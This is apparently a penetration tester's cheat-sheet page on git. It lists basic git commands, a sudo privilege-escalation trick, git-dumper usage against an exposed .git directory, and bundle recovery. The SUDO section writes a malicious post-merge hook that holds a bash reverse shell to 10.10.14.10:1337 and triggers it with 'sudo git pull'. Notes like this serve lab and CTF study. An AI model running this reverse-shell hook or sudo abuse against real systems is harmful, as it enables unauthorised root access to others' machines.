---
title: "git"
date: 2024-6-28
tags: ["git", "git-dumper", "sudo", "privesc"]
---

---
### Basic Commands

```bash
# Show status
git status
```

```bash
# Reset the current branch to a previous commit
git reset --hard
```

```bash
# Show information about files
git ls-files --stage
```

```bash
# Show current branch
git branch
```

```bash
# Show commits
git log <BRANCH_NAME> --oneline
```

```bash
# Show diff, a and b are commit hash
# a is the older commit
git diff [a] [b]
```

```bash
# Show commit
git show <COMMIT_HASH>
```

<br>

---

### SUDO

```bash
# Copy target project
cp -r /var/www/html/project .
```

```bash
# Create a malicious post-merge
echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.10/1337 0>&1' > ./project/.git/hooks/post-merge
```

```bash
# Run
sudo /usr/bin/git pull
```

<small>*Note: Make changes to the project to make the pull work*</small>

---

### git-dumper

[Download git-dumper](https://github.com/arthaud/git-dumper)

```bash
git-dumper http://10.10.11.10/.git result/
```

<br>

---

### git-bundle

```bash
# List all bundles
find . -type f -exec file {} \;
```

```bash
# Get bundle
git clone -b master @hashed/ab/cd/<HASH>.bundle
```

<br>